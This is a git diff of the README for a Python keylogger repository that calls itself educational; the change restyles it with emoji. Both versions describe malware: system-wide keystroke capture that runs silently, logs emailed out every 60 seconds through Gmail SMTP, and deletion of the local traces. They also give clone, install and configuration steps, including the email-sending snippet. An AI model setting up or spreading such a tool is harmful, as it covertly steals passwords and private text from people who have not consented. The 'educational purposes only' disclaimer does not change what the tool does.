@@ -1,83 +1,83 @@
-# Keylogger
+🖥️ Keylogger – Educational Python Project
 
-A simple yet effective keylogger written in Python. This tool is designed for educational purposes to demonstrate concepts in cybersecurity and Python programming. It captures keystrokes, logs them to a file, and periodically emails the logs to a specified address. The script operates discreetly in the background using threading.
 
-## Features
 
--   **Keystroke Logging:** Captures all keyboard events and saves them with timestamps to a local file.
--   **Background Operation:** Runs as a background process using Python's `threading` module, allowing it to log keystrokes without an active terminal window.
--   **Automated Email Reports:** Periodically sends the captured logs as an email attachment using a secure SMTP connection with Gmail.
--   **Log Management:** Automatically deletes the log file after it has been successfully emailed to maintain cleanliness and reduce its on-disk footprint.
 
-## How It Works
 
-1.  **Listener:** The script uses the `keyboard` library to set up a global listener that captures every key press.
-2.  **Logging:** Each key press event is timestamped and appended to a log file located at `C:\Users\Public\logfile.txt`.
-3.  **Background Scheduler:** A separate thread is started that runs a scheduler function.
-4.  **Emailing:** This scheduler function wakes up at a defined interval (every 60 seconds by default), reads the log file, attaches it to an email, and sends it to the configured recipient.
-5.  **Cleanup:** After the email is sent successfully, the local log file is deleted.
-6.  **Persistence:** The main thread uses `keyboard.wait()` to run indefinitely, ensuring the key listener remains active.
 
-## Getting Started
+A simple yet powerful keylogger written in Python 🐍 for educational purposes. This tool demonstrates concepts in cybersecurity and Python programming by capturing keystrokes, logging them to a file, and periodically emailing the logs to a specified address. The script runs silently in the background using threading.
 
-Follow these instructions to get a copy of the project up and running on your local machine.
+✨ Features
 
-### Prerequisites
+⌨️ Keystroke Logging – Captures all keyboard events with timestamps 📅.
 
--   Python 3.x
--   pip (Python package installer)
+🧵 Background Operation – Uses Python's threading for seamless background execution.
 
-### Installation
+📧 Automated Email Reports – Sends captured logs securely via Gmail’s SMTP.
 
-1.  Clone the repository to your local machine:
-    ```sh
-    git clone https://github.com/lakshya-004/Keylogger.git
-    ```
-2.  Navigate to the project directory:
-    ```sh
-    cd Keylogger
-    ```
-3.  Install the required Python package:
-    ```sh
-    pip install keyboard
-    ```
+🗑️ Log Management – Deletes logs after sending to keep things clean and secure.
 
-## Usage
+⚙️ How It Works
 
-### Configuration
+Listener – Uses keyboard library to capture key presses.
 
-Before running the script, you must configure your email settings within `Main.py`.
+Logging – Saves keystrokes with timestamps in C:\Users\Public\logfile.txt.
 
-1.  Open `Main.py` in a text editor.
-2.  Locate the `schedule_email` function.
-3.  Replace the placeholder values for `sender_email`, `app_password`, and `recipient_email`.
+Scheduler – Runs in a background thread ⏱️.
 
-    ```python
-    # Inside the schedule_email function
-    send_email_with_attachment(
-        sender_email="your_email@gmail.com",
-        app_password="your_gmail_app_password",
-        recipient_email="recipient_email@example.com",
-        subject="Keylogger Log File",
-        body="Attached is the keylogger log file.",
-        file_path=log_file_path
-    )
-    ```
+Emailing – Sends log files as email attachments at defined intervals.
 
-    > **Important:** For `app_password`, you must generate a **Google App Password** for your Gmail account. Your regular password will not work if you have 2-Factor Authentication enabled.
+Cleanup – Deletes log file after successful email transmission.
 
-4.  **(Optional)** You can change the email sending interval by modifying the `time.sleep(60)` value (in seconds) within the `schedule_email` function.
+Persistence – Keeps running silently until manually stopped.
 
-### Running the Script
+🚀 Getting Started
+📋 Prerequisites
 
-Execute the script from your terminal. Administrator privileges may be required for the keylogger to capture keystrokes system-wide.
+Python 3.x
 
-```sh
+pip (Python package manager)
+
+🛠️ Installation
+# Clone the repository
+git clone https://github.com/lakshya-004/Keylogger.git  
+
+# Navigate into the project folder
+cd Keylogger  
+
+# Install dependencies
+pip install keyboard
+
+📝 Configuration
+
+Before running the script, update your email settings inside Main.py:
+
+send_email_with_attachment(
+    sender_email="your_email@gmail.com",
+    app_password="your_gmail_app_password",
+    recipient_email="recipient_email@example.com",
+    subject="Keylogger Log File",
+    body="Attached is the keylogger log file.",
+    file_path=log_file_path
+)
+
+
+🔹 Use a Google App Password instead of your Gmail password (required for 2FA accounts).
+🔹 Change time.sleep(60) inside schedule_email() to adjust the email interval (in seconds).
+
+▶️ Running the Script
 python Main.py
-```
 
-The script will now run in the background. To stop it, you must terminate the process (e.g., press `Ctrl+C` in the terminal or end the process through your system's Task Manager).
 
-## Disclaimer
+The script runs in the background silently. To stop it:
 
-This project is intended for **educational purposes only**. The misuse of this software is strongly discouraged. Using this keylogger on any computer without the owner's explicit permission is illegal and unethical. The author of this repository is not responsible for any damage or legal issues caused by the misuse of this tool. Use it responsibly and at your own risk.
+Press Ctrl + C in the terminal, or
+
+End the process via Task Manager.
+
+⚠️ Disclaimer
+
+This project is for educational purposes only 🏫.
+Misuse of this tool on systems without explicit permission is illegal and unethical.
+The author is not responsible for any misuse or consequences.
+Use responsibly and within the boundaries of the law ⚖️.
